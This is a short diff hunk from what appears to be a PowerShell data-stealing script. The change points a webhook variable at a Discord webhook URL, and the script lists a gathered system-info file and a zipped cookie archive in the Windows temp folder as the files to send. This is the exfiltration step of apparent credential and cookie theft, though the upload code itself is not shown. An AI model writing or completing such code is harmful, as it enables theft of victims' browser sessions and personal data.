@@ -33,7 +33,7 @@ param (
     [string]$file
 )
 
-$hookurl = "$dc"
+$hookurl = "https://discord.com/api/webhooks/$dc"
 
 $files = @("C:\Windows\Temp\info.txt", "C:\Windows\Temp\cookies.zip")
 
